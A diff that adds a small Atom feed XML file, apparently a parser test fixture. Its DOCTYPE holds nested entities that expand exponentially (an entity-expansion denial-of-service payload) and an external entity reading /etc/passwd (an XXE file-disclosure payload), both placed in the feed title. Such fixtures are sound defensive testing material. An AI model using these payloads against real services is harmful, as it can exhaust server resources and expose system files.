@@ -1,0 +1,9 @@
+<?xml version="1.0"?>
+<!DOCTYPE feed [
+ <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+ <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
+ <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
+ <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
+ <!ENTITY e SYSTEM "file:///etc/passwd">
+]>
+<feed xmlns="http://www.w3.org/2005/Atom"><title>&d;&e;</title></feed>
